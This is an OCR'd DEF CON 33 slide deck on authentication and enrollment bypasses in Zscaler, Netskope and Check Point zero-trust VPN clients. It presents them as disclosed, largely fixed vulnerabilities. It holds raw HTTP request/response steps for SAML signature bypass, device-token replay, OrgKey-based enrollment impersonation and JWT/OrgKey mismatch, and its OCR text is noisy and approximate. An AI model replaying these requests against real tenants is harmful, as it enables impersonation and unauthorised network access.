---
title: "Zero Trust Total Bust - Breaking into thousands of cloud-based VPNs with one bug"
speakers: ["David Cash Rich Warren"]
conference: "DEF CON"
conference_full: "DEF CON 33"
edition: "33"
year: 2025
source_pdf: "DEF CON 33/David Cash Rich Warren - Zero Trust Total Bust - Breaking into thousands of cloud-based VPNs with one bug.pdf"
pages: 88
sha256: "11146ae980fec9580579b230d38de676a36040c9005538c0a84d35f2c3a8539f"
text_chars: 39021
ocr_pages: 72
has_ocr: true
redacted_secrets: 0
ocr_confidence: 87.4
ocr_unreliable_blocks: 4
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T06:59:55Z"
---
# Zero Trust Total Bust - Breaking into thousands of cloud-based VPNs with one bug

**Speakers:** David Cash Rich Warren  
**Conference:** DEF CON 33  
**Source:** `DEF CON 33/David Cash Rich Warren - Zero Trust Total Bust - Breaking into thousands of cloud-based VPNs with one bug.pdf` (88 pages)


## Slide 1

## Slide 2

ZERO TRUST – TOTAL BUST

-

-

-

**2**

## Slide 3

ZERO TRUST – TOTAL BUST

**3**


> Recovered by OCR — confidence 94/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST NETWORK ACCESS
Validating Validating Validating Validating
the User Access Posture the Device
A
Is the user Does the user : Is this a
authenticated have explicit Is the device recognized and
and verified? permission? compliant? secure device?
\ y
```

## Slide 4

ZERO TRUST – TOTAL BUST

-

-

-

-

**4**


> Recovered by OCR — confidence 91/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST -T
Buzz Words
* SASE - Secure Access Service Edge. Traffic is
assessed for compliance in a cloud service before
forwarding to the destination
* Traffic Steering - The process of directing user traffic fe]
= =
through secure, policy-based paths to access specific
applications or resources
* Identity Provider (IdP) - Not responsible for
securing your SAML implementation
* Privacy - When your data is not exposed to everyone
```

## Slide 5

ZERO TRUST – TOTAL BUST

# **“**

**5**


> Recovered by OCR — confidence 95/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST
TIRED OF PATCHING
YOUR SSL VPN
What about Zscaler? Did you APPLIANCE?
look at that or any other zero
trust products?
MOVE TO Al
ZERO SAFE™
It’s safer, because it’s in the cloud
```

## Slide 6

ZERO TRUST – TOTAL BUST

**6**


> Recovered by OCR — confidence 78/100 on the text kept, 51/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST -°
You’re Using it Wrong!
I
```

## Slide 7

ZERO TRUST – TOTAL BUST

**7**


> Recovered by OCR — confidence 78/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - |
You’re REALLY Using it Wrong!
Conditional Access
No MFA for ports OnE
y_N ZTNA ranges ey
'
'
'
ANY
— Zero Trust Engine ANY > | ZTNA Broker
ha ANY
'
'
:
```

## Slide 8

ZERO TRUST – TOTAL BUST

-

-

-

**8**


> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST -°
Conditional Access Bypasses
+
Conditional Access policy
Control access based on Conditional Access Control user access based on their network or
e Conditional access policies permitting policy to bring signals together, to make physical location. Learn more
authentication without MFA from ‘trusted Learn more cf Configure ©
locations Name *
* Blending in - if the company all use | zscaler Trusted Location | Include Exclude
Zsca ler, you re not gol ng to stand out Assignments Select the locations to exempt from the policy
Users @) OQ All trusted networks and locations
: (®) Selected networks and locations
Target resources @)
All resources (formerly ‘All cloud apps’) Select
ZScaler
Network NEW ©
Any network or location and 1 excluded
```

## Slide 9

ZERO TRUST – TOTAL BUST

-

-

-

- **`UploadToSftp`**

   -

-

**9**


> Recovered by OCR — confidence 89/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Check Point - Harmony SASE
Extract Private ¢ Check Point’s ZTNA offering
Key ¢ Authentication flow exchanges user credentials for a JWT
¢ Stores the JWT in log files
. function:
Fetch all customer ¢ Uploads those log files to an SFTP server
logs ¢ Uses a hard coded key for the SFTP server - encrypted in the binary...
Authenticate with
```

## Slide 10

ZERO TRUST – TOTAL BUST

-

-

**10**


> Recovered by OCR — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Check Point - Harmony SASE
Extract Private
Key
Fetch all customer
logs
Authenticate with
* ...with a key that’s in the binary
Locals
Search (Ctri+E)
Name
args
decode
¢ The log files are encrypted...
foreach ( text5 in Directory.GetFiles(dirname, "*", SearchOption.AllDirectories))
{
ZipEntry zipEntry = ZipEntry(Path.GetRelativePath(dirname, text5))
DateTime = DateTime.Now,
IsCrypted = trt
};
zipOutputStream.PutNextEntry(zipEntry);
zipOutputStream.Password = text2;
10
```

## Slide 11

ZERO TRUST – TOTAL BUST

-

-

-

-

**11**


> Recovered by OCR — confidence 89/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Check Point - Harmony SASE
Extract Private
Locals
Nan Value
“Agent20250314072156"
Fetch all customer
logs
J ¢ This grants access to:
¢ A list of Harmony SASE customers
* Their JWTs, which were valid for one month
Authenticate with
SFTP read access removed by Check Point immediately after reporting.
```

## Slide 12

ZERO TRUST – TOTAL BUST
Bug Type Zscaler Netskope Check Point
Authentication Auth Bypass
Steering Bypass
Authorization
Config Theft
Priv Esc
Device Trust
Posture Bypass

## Slide 13

ZERO TRUST – TOTAL BUST

**13**


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - TC
Recon from Outside - Zscaler
Authenticate |
```

## Slide 14

ZERO TRUST – TOTAL BUST

### **Request**

### **Response**

**14**


> Recovered by OCR — confidence 91/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recon from Outside - Zscaler
Provide
J
Fetch Endpoint
Fetch Config
Authenticate
POST /api/mobile/cloud/getGlobalCloudMapping HTTP/1.1
Content-Type: application/json
User-Agent: Windows Windows 10 Enterprise ZTunnel/1.5.1.8
auth-token: 2REMOVED498jA==
Host: mobile.zscaler.net
{"blob":"Ez4HSmTm5ShP51. .NuAVp5YQs/TDaw==" }
Response
HTTP/1.1 200 OK
Server: Zscaler
Content-Length: 93
Content-Type: application/json
{"success":"true","cloud_data":
[{"cloud_name":"zscaler", "ma_hostname"
14
```

## Slide 15

ZERO TRUST – TOTAL BUST

### **Request**

### **Response**

\```
mobile.zscaler.net
\```

**15**


> Recovered by OCR — confidence 91/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recon from Outside - Zscaler
Provide
J
Fetch Endpoint
Fetch Config
Authenticate
POST /api/mobile/cloud/getGlobalCloudMapping HTTP/1.1
Content-Type: application/json
User-Agent: Windows Windows 10 Enterprise ZTunnel/1.5.1.8
auth-token: 2REMOVED498jA==
Host: mobile.zscaler.net
{"device_type": "3", "lLogin_name": "user@example.com"}
Response
HTTP/1.1 200 OK
Server: Zscaler
Content-Length: 93
Content-Type: application/json
[{"cloud_name":"zscaler", "ma_hostname"
:"mobile.zscaler.net"}]}
15
```

## Slide 16

ZERO TRUST – TOTAL BUST

### **Request**

### **Response**

**16**


> Recovered by OCR — confidence 91/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recon from Outside - Zscaler
|
Provide
Email/Tenant POST /api/mobile/cloud/getAup HTTP/1.1
Content-Type: application/json
auth-token: iDylREMOVEDnVbOTQ==
User-Agent: Windows Windows 10 Enterprise ZTunnel/1.5.1.8
Host: mobile.zscaler.net
Fetch Endpoint {"blob":"sqP9iIKUnhKZ4uUF. .152tF+Jd7s81+Ag2b6nqx2yg=="}
Fetch Config HTTP/1.1 200 OK
Content-Type: application/json
:0,"aup_data":"<b>Acceptable Use Policy is not configured for your
16
```

## Slide 17

ZERO TRUST – TOTAL BUST

### **Request**

### **Response**

**17**


> Recovered by OCR — confidence 87/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recon from Outside - Zscaler
|
Provide
Email/Tenant POST /api/mobile/cloud/getAup HTTP/1.1
Content-Type: application/json
auth-token: iDylREMOVEDnVbOTQ==
User-Agent: Windows Windows 10 Enterprise ZTunnel/1.5.1.8
Host: mobile.zscaler.net
Fetch Endpoi . .
etch Endpoint {"device_type": "3", "login_name": "user@example.com"}
Fetch Config HTTP/1.1 200 OK
Content-Type: application/json
y {"success":"true","error":"0","aup_enabled":"0","aup_type":0, "aup_days"
:0,"aup_data":"<b>Acceptable Use Policy is not configured for your
Authenticate LtAuthType":1,"proxy_enabled":"true", ...
17
```

## Slide 18

ZERO TRUST – TOTAL BUST

-

-

-

-

-

-

-

**18**


> Recovered by OCR — confidence 80/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What’s in a Pre-Auth Config?
& Powershell x +
(env) PS F:\PyScaler> python .\pyscaler.py zscaler@amberwolf.com aup
¢ We can pull some configuration information
unauthenticated, but is it useful? i991 IMFO = aap:
¢ Enabled features per tenant
¢ Authentication settings
* Cloud Features enabled - e.g. ZPA / ZDX etc.
* Client settings enabled - e.g. log export scallectRachinetosth
"collectZdxLocation":
* cookieBlob is encrypted with RC4 relablecashyees"
“override rotocolSettil
(always the same value) sgrantccessTozecalerLogralde
Acceptable Use Policy is not configured for your company</b>",
"wbcUserAgentSuffix
"autofilLIDPUsernam
"autoFillUsing
“enableZpaAuthUserName": false,
“browser_auth": false,
“useDefaultBrowser": false,
“cloud_name": "zscaler",
“zia_cloud_name": “zscaler",
18
```

## Slide 19

ZERO TRUST – TOTAL BUST

-

-

-

-

-

-

**19**


> Recovered by OCR — confidence 84/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
What’s in a Pre-Auth Config?
function F
0") privateIP.test(resolved_ip))
3
* PAC file (Now fixed in Zscaler) SP (Ce Ae,
bd Internal hosts if (isPlainHostName(host) || privateIP.test(resolved_ip))
return "DIREC
° Expired domains . . if (shExpMat host, "*.cloudfront.net"))
¢ Wildcard misconfigurations canada
if (shExpMatch(host, "*.live.com") || shExpMatch(host, "*.office.com")
shExpMat host, "*.office365.com") || shExpMatch(host,
return "DIRECT";
if (shExpMatch(host, "*.login-*zerosafe.ne
return "DIRECT";
if (dnsDomai "e yzrandomunregistered9
return "DIRECT";
"DIRECT";
return "PROXY 147.161.141.21:80; PROXY 165.225. DIRECT";
```

## Slide 20

ZERO TRUST – TOTAL BUST

**20**


> Recovered by OCR — confidence 77/100 on the text kept, 58/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Proxy Authentication - Zscaler ZIA
b— Request website >
User f
Cookie & Request >
scaler
— Request =
```

## Slide 21

ZERO TRUST – TOTAL BUST

**21**


> Recovered by OCR — confidence 73/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST -°
Proxy Authentication - Cookie Replay
Ib Request website >>»
Entra ID zscaler
- Cookie & Request > _ ol Request >
1
Attacker
```

## Slide 22

ZERO TRUST – TOTAL BUST

**22**

## Slide 23

ZERO TRUST – TOTAL BUST

### **Request**

### **Response**

**23**


> Recovered by OCR — confidence 90/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Zscaler SAML Authentication Bypass
|
Provide
i
Fetch
Endpoint
Fetch Config
Authenticate
GET /clstart?
version=1&_domain=examp le. com&redrurl=https%3A%2F%2Fmobile.zscaler.net%
2Ftest.html&code_challenge=784Kyk5rgyp5R6qn0AoA9pGPU8Kd6XGEmVRggwS j Hxw&
code_challenge_method=S256 HTTP/1.1
Host: login.zscaler.net
User-Agent: Microsoft Windows 11 Pro ZTunnel/4.7.0.61
Connection: keep-alive
HTTP/1.1 200 OK
Content-Type: text/html
Server: Zscaler/6.2
Cache-Control: no-cache
Content-length: 616
. <input type="hidden" name="SAMLRequest"
23
```

## Slide 24

ZERO TRUST – TOTAL BUST

### **Request**

\```
SAMLResponse=PD94bWwgdmVyc2lvbj0nMS4
wJyBlbmNvZGluZz0ndXRmLT…
\```

### **Response**

\```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3M...
\```

**24**

## Slide 25

ZERO TRUST – TOTAL BUST

-

**25**


> Recovered by OCR — confidence 85/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Zscaler SAML Authentication Bypass
* Changing the subject should invalidate the signature
<saml2:Subject><saml2:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-
<saml2:SubjectConfirmation><saml2:SubjectConfirmationData NotBefore="2025-07-
16T14:40:19.005Z" NotOnOrAfter="2025-07-161T14:42:19.005Z"
Recipient="zscaler.net"/></saml2:SubjectConfirmation></saml2:Subject>
16T14:40:19.005Z" NotOnOrAfter="2025-07-161T14:42:19.005Z"
Recipient="zscaler.net"/></saml2:SubjectConfirmation></saml2:Subject>
```

## Slide 26

ZERO TRUST – TOTAL BUST

-

**26**


> Recovered by OCR — confidence 90/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Zscaler SAML Authentication Bypass
¢ But the signature is not validated and we get a JWT back - this is enough for enrolment! GS
Headers =
"HS256",
Payload = {
"iss": "ZIA",
"sub": "ZCC",
"exp": 1752676819,
"jti": "Ss019tj2",
"uname": "alice@example.com",
"token": "6vKJY6w+<REMOVED>B+USo="
}
Signature = "iwlrG60N3ISRM_jQZaFlxypKd7ga_ymbEOXxoU4sEf8"
```

## Slide 27

ZERO TRUST – TOTAL BUST

-

-

-

-

-

**27**


> Recovered by OCR — confidence 86/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST -"
Zscaler SAML Authentication Bypass
* Complete authentication bypass for any Zscaler tenant using SAML for auth! &
¢ Reported to Zscaler Friday 18" July
* Confirmed fixed by Zscaler Friday 18" July - the same day!
¢ Regression identified and reported on 22™ July
¢ Regression now fixed &
@ We've run into an Error
Need help? Contact your IT support dP:
```

## Slide 28

ZERO TRUST – TOTAL BUST

**28**


> Recovered by OCR — confidence 93/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Zscaler SAML
Authentication Bypass
```

## Slide 29

ZERO TRUST – TOTAL BUST
Bug Type Zscaler Netskope Check Point
Authentication Auth Bypass
Steering Bypass
Authorization
Config Theft
Priv Esc
Device Trust
Posture Bypass

## Slide 30

ZERO TRUST – TOTAL BUST

-

-


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - |
Device Token Authentication
* Zscaler also support an authentication mode called
* This non-default mode allows administrators to generate a token which can be used to
authenticate devices via the Zscaler Client Connector Portal (or ZIdentity) IdP
Client Connector
0 Using Zscaler Client Connector Portal as an Identity Provider
If you are a Zidentity user, see Using Zidentity as an Identity Provider.
The Zscaler Client Connector Portal can function as an identity provider (IdP) for the Zscaler service. With this feature, users do not need to
be tied to your organization's standard IdP in order to authenticate to the Zscaler service. Instead, if your organization uses SAML-based
single sign-on (SSO), Zscaler Client Connector can use a device token to auto-provision and silently authenticate users and devices for the
Zscaler service.
You can generate the device token in the Zscaler Client Connector Portal and pass the token to Zscaler Client Connector in an installer option.
In addition, in the ZIA Admin Portal, you must select the Zscaler Client Connector Portal as your authentication method. The app is then able
to gather user ID and other relevant parameters from devices and send the information to the Zscaler cloud in SAML requests. The Zscaler
Client Connector Portal parses and verifies the SAML requests, enabling the Zscaler cloud to provision and silently authenticate users.
```

## Slide 31

ZERO TRUST – TOTAL BUST

-

-

What happens if we change this value?


> Recovered by OCR — confidence 87/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - |
Device Token Authentication
* Zscaler also support an authentication mode called
* This non-default mode allows administrators to generate a token which can be used to
authenticate devices via the Zscaler Client Connector Portal (or ZIdentity) IdP
The following image is an example of a CLI that uses all the available install options, where:
What happens if we
change this value?
e The absolute path to the MSI file is c: \Users\User\Downloads\Zscaler-windows-1.2.0.000311-installer.msi.
¢ The /quiet switch is used to install the app in silent mode.
¢ The cloud on which the organization is provisioned is zscalertwo.
\ « The device token value is 4¢36647447326e5a55
@ e ‘ ~ ¢ The policy token value is 32343. E31204D696772617
“~ ~ ~“\ « The organization's domain name is safemarch.com.
“ ¢ The UNAME is test.
« The EXTERNALDEVICEID is TestDevice.
« ANTITAMPERING is 1.
```

## Slide 32

ZERO TRUST – TOTAL BUST

•


> Recovered by OCR — confidence 77/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST -°
evice Token Authentication
¢ Device token and User values are set in the registry:
EB Registry Editor a oO x
e avorites Hel File Edit View Favorites Help
HKEY_LOCAL_MACHINE\SOFTWARE\Zscaler Inc.\Zscaler Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Zscaler Inc.\Zscaler\EXTRA
uter Name Type Data OEM Name Type Data
EV LOCAL MACHINE ab) Location REG_SZ C:\Program Files\Zscaler bal ner REG_SZ
ecb00000000 ab) LWFBootStart REG_SZ 0 poe 2B PolicyToken REG SZ
HARDWARE ab] NamedDomain REG_SZ C:\Program Files\ZSAMSinsta Setup PP ab) SEFailCloseThumbprint REG SZ
SAM ServicesStoppableAllowed REG_DWORD 0x00000000 (0) WOW6432Node
Classes ab) UselWFDriver REG SZ 0 Sas
Clients [2b] UserName REG_SZ userl | sySTEM
DefaultUserEnvironm: ab/VDI REG_SZ HKEY_USERS
intel
```

## Slide 33

**ZERO TRUST – TOTAL BUST**


> Recovered by OCR — confidence 94/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZScaler Device
Token Replay & User
Impersonation
```

## Slide 34

ZERO TRUST – TOTAL BUST

-

-

-

-

-

**34**


> Recovered by OCR — confidence 88/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - 1
Netskope +
¢ Similar architecture to Zscaler
¢ Processes Internet traffic and can route to on-premise or private applications
(Netskope Private Access)
¢ Why? - we saw it on a red team job and could smell the root. va
Terminology
* Org Key: Unique identifier for a tenant within the Netskope environment (e.g. 1FaK3OrGk3ysQYMcytbk)
¢ User Key: Unique identifier for an individual user within a tenant (e.g. U53rk3ygljv89dIbt4i7 )
```

## Slide 35

ZERO TRUST – TOTAL BUST

**Request** **`POST /nsauth/client/authenticate zerosafe`**

### **Response**

\```
PHNhbWxwOkF1dGhuUmVxdW…UmVxdWVzdD4=
\```

**35**

## Slide 36

ZERO TRUST – TOTAL BUST

**36**


> Recovered by OCR — confidence 86/100 on the text kept, 59/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recon from Outside - Netskope
Provide
~
Fetch Config
r
Authenticate?
~
OrgKey can also be leaked via admin portal IDP
mE From Base64
SecureAuth83/SecU Raw Inflate .
Submission: On March 26 via manual from =a Q e Adaptive
Page URL History
This captures the URL locations of the websit a,
Meta fields. saml/acs">
cT v
J Auto Bake
mé62WyBéaqJICCSIK7Z%2FtsQsDUKmY4LOtmofaOl4s169R%2FOISCS5Pc8dPMMtMgd3Fg2bnlualJAj%2F 1c
```

## Slide 37

ZERO TRUST – TOTAL BUST

**Request** **`GET /mobile/user/pac?orgkey=<OrgKey>`**

### **Response**

**37**


> Recovered by OCR — confidence 84/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Recon from Outside - Netskope
Provide Host: nsauth-zerosafe.goskope.com
Email/Tenant Connection: keep-alive
Y Other URLs:
HTTP/1.1 200 OK /config/getexceptionlist
Fetch Config date: Thu, 17 Apr 2025 09:20:09 GMT /config/org/version
content-type: application/x-ns-proxy-autoconfig /contig/org/clientconfig
| /v2/config/org/getmanagedchecks
4 >) function FindProxyForURL(url, host) { Teen RCV GORGE
Authenticate? if (!shExpMatch(url, "https://*") &
!shExpMatch(url, "http://*")) return "DIRECT"
37
```

## Slide 38

|**Request**|
|---|
|**`POST /nsauth/client/authenticate`**|
|**`zerosafe`**|

### **Response**

\```
PHNhbWxwOkF1dGhuUmVxdW…UmVxdWVzdD4=
\```

## Slide 39

### **Request**

### **Response**


> Recovered by OCR — confidence 90/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request
POST /zerosafe.net/saml2 HTTP/1.1
Host: Login.microsoftonline.com
netskope
Response
Content-Type: text/html; charset=utf-8
Working...
method="POST" name="hiddenform" action="https://nsauth-
type="hidden" name="SAMLResponse"
SAML Resp
```

## Slide 40

### **Request**

### **Response**


> Recovered by OCR — confidence 85/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
POST /nsauth/sam12/http-post/ORGKEY/acs/4 HTTP/1.1
SAML Reo Referer: https://login.microsoftonline.com/zerosafe/saml2
Host: nsauth-zerosafe.goskope.com
SAML Resp
3wt ovision_idp
netskope
Response
HTTP/1.1 200 OK
content-type: text/html; charset=utf-8
content-Llength: 2004
<!DOCTYPE html>
<title>Authentication Success</title
div id="NsLoginStatus" style="display: none;"
name="JWT_NSUserInformation" value="eyJ0eXA10. .K8Vw"
```

## Slide 41

### **Request**

### **Response**


> Recovered by OCR — confidence 86/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SAML Req
Y SAML Rese
Email
SAML Reg
SAML Resp
>
Enrol
>| netskope
User Key
GET /config/user/getbrandingbyemail?
HTTP/1.1
Host: addon-zerosafe.goskope.com
User-Agent: Windows NT 11.0 x64;Netskope ST Agent
123.0.0.2272;Hostname
Accept: */*
Connection: keep-alive
HTTP/1.1 200 OK
content-length: 412
strict-transport-security: max-age=16000000;
includeSubDomains; preload;
{"AddonCheckerHost": "achecker-
zerosafe.goskope.com", "AddonCheckerResponseCode": "netSkope
@netSkope", "AddonManagerHost": "addon-
zerosafe.goskope.com", "EncryptBranding":true, "
1Fak30rGk3ysQYMcytbk": "OrgKey", "OrgName":"ZeroSafe", "SFChe
ckerHost":"sfchecker.goskope.com", "SFCheckerIP":"8.8.8.8",
bt4i7","ValidateConfig":false, "tenantID":"9999999"}
```

## Slide 42

### **Request**

Where did the auth go?

### **Response**


> Recovered by OCR — confidence 85/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SAML Req
Y SAML Rese
Email
SAML Reg
SAML Resp
>
Enrol
>| netskope
User Key
GET /config/user/getbrandingbyemail?
HTTP/1.1
User-Agent: Windows NT 11.0 x64;Netskope ST
auth go?
123.0.0.2272;Hostname
Accept: */*
Connection: keep-alive
HTTP/1.1 200 OK
content-length: 412
strict-transport-security: max-age=16000000;
includeSubDomains; preload;
{"AddonCheckerHost": "achecker-
zerosafe.goskope.com", "AddonCheckerResponseCode": "netSkope
@netSkope", "AddonManagerHost": "addon-
zerosafe.goskope.com", "EncryptBranding":true, "
1Fak30rGk3ysQYMcytbk": "OrgKey", "OrgName":"ZeroSafe", "SFChe
ckerHost":"sfchecker.goskope.com", "SFCheckerIP":"8.8.8.8",
bt4i7","ValidateConfig":false, "tenantID":"9999999"}
```

## Slide 43

Request

Be whoever you like! **Response**


> Recovered by OCR — confidence 87/100 on the text kept, 62/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SAML Rese
Email
>
SAML Reg
SAML Resp >
Enrol
>
User Key
NUMBER 01- -47-
— 87441
Request
GET /config/user/getbrandingbyemail?
HTTP/1.1
Host: addon-zerosafe.goskope.com
User-Agent: Windows NT 11.0 x64;Net
Naeem Be whoever you
like!
UU License
rope ST Agent
includeSubDomains ;
{"AddonCheckerHost": "achecker-
zerosafe.goskope.com", "AddonCheckerResponseCode":
netSkope@netSkope
U53rk3ygljv89dIbt4i7", "ValidateConfig": false, "tenantID":"9999999"}
```

## Slide 44

### **Request**

### **Response**


> Recovered by OCR — confidence 85/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request zg n =
GET /v2/config/org/clientconfig?
tenantconfig=1 HTTP/1.1
SAML Resp Host: addon-zerosafe.goskope.com
User-Agent: Windows NT 11.0 x64;Netskope ST Agent
a Accept: */*
netskope Connection: keep-alive
User Ke
Get Cc onfig :
Response
HTTP/1.1 200 OK
Config & Certs date: Fri, 28 Feb 2025 10:31:33 GMT
content-type: application/json
content-Length: 9476
strict-transport-security: max-age=16000000;
includeSubDomains; preload;
SAML Resp
nabled":"0","OverrideAccessMethodDetection":"0","add_os_a
nd_access_method_to_ssl_decryption":"0","advance_firewall
_enabled":"0","alert_acknowledge":"0","allowClientDisabli
ng":"false", "allowIdPLogout":"false",
Vv
```

## Slide 45

**Request** **`U53rk3ygIjv89dIbt4i7 1FaK30rGk3ysQYMcytbk`**

### **Response**

\```
"usercert.pkcs12"
\```


> Recovered by OCR — confidence 89/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Request
GET /v2/config/user/cert?
HTTP/1.1
User-Agent: Windows NT 11.0 x64;Netskope ST Agent
IWwT 123.0.0.2272;Hostname
Enrol netskope Connection: keep-alive
User Ke
Get Cc onfig :
Response
HTTP/1.1 200 OK
Config & Certs Server: NSSVC/1.0
Content-Type: application/x-pkcs12
Content-Disposition: attachment;
Keep-Alive: timeout=5
Content-Length: 2754
SAML Resp
Vv
```

## Slide 46

**ZERO TRUST – TOTAL BUST**


> Recovered by OCR — confidence 94/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Authentication Bypass - Netskope
4, Remediation
NSKPSA-2024-001
Netskope has fixed the gap and recommends customers to review their deployments
of Netskope Client and enable the fix in their tenants. Here is the detailed guide -
Netskope Security Advisory — Netskope client enrollment bypass issue
Workaround
There is no countermeasure available to remediate the gap without enabling Secure
Enrollment, but follow the below steps to minimize the risk:
Security Advisory ID: NSKPSA-2024-001 Severity Rating: Hig!
First Communicated: Apr 18, 2024 Overall CVSS Score: 8.5
Version: 1.0 CVE-ID: CVE-2024-7401 Enable device compliance and device classification
Create a policy to block all traffic for the devices which are not meeting the device
compliance checks and are not falling under proper device classification.
Description
Netskope was notified about a security gap in Netskope Client enrollment process
where NSClient is using a static token “Orgkey” as authentication parameter. Since Special Notes and Acknowledgement
this a static token, if leaked, cannot be rotated or revoked. A malicious actor can use Netskope credits Sander di Wit for reporting this flaw
this token to enroll NSClient from a customer's tenant and impersonate. :
```

## Slide 47

ZERO TRUST – TOTAL BUST

-

-

-

-

-

-

-

-


> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST - |
IdP Mode Auth Bypass - The fix
+
April 18th 2024: According to the NSKPSA-2024-901 advisory, Netskope was notified about the IdP
mode auth bypass
August 26" 2924: CVE-2924-7401 and Netskope advisory released, describing a fix using Secure
Enrollment
* Anew enrolment method introduced in release 116.19.9
* They also advise to enable device compliance and classification (i.e. posture) checks
* The advisory states:
February 3" 2925: With version release 123, Secure Enrollment is enforced by default for all new
tenants
March 2025: We found and exploited this same bug on a Red Team engagement
July 2925: We still see tenants without Secure Enrollment enabled
```

## Slide 48

ZERO TRUST – TOTAL BUST

-

-

-

## Slide 49

### **Request**

### **Response**


> Recovered by OCR — confidence 82/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
SAML Req
Y SAML Rese
SAML Req
SAML Reso >
Enrol = netskope
iz User Key
Request R \n
GET /v1/branding/tenant/?orgkey=1FaK30rGk3ysQYMcytbk
HTTP/1.1
Host: enrolment-eu.goskope.com
User-Agent: Windows NT 11.0 x64;Netskope ST Agent
4 Authorization: Bearer eyJO...
Connection: keep-alive
Response
HTTP/1.1 200 OK
strict-transport-security: max-age=16000000;
includeSubDomains; preload;
{"AddonCheckerHost": “achecker-
zerosafe.goskope.com", "AddonCheckerResponseCode": "netSkope
@netSkope", "AddonManagerHost": "addon-
QYMcytbk": "OrgKey", "OrgName": "ZeroSafe", "SFCheckerHost":"s
fchecker.goskope.com", "SFCheckerIP":"8.8.8.8", "UserEmail":
```

## Slide 50

ZERO TRUST – TOTAL BUST

**Request**


> Recovered by OCR — confidence 92/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ZERO TRUST
Authentication Bypass - Netskope
+
d with the secure enrolment key
GET /v1/branding/tenant/
HTTP/1.1
Host: enrolment-eu.gosko
User-Agent: Windows NT 1
123.0.0.2272;Hostname
Authorization: Bearer ey
nt",
-aK30rGk3ysQYMcytbk",
Accept: */* *40zerosafe.net",
Connection: keep-alive 1741602516,
06092,
But which Org
```

## Slide 51

## Slide 52

ZERO TRUST – TOTAL BUST

### **Request**

## **`BBBBBB`**


> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Netskope - JWT/URL Mismatch
GET /v1/branding/tenant/?orgkey=BBBBBB HTTP/1.1
Host: enrolment-eu.goskope.com
User-Agent: Windows NT 11.0 x64;Netskope ST Agent
123.0.0.2272;Hostname
Authorization: Bearer eyJO...
Accept: */*
Connection: keep-alive
( Is this a valid
OrgKey?
L rey Use this XY
Start Enrolment for
BBBBB
[on the enrolment key /
match the OrgKey in the
L IwT?
"Iss": "client",
"OrgKey": "AAAAAA",
"UPN": "alan%40zerosafe.net",
"UTCEpoch": 1741602516,
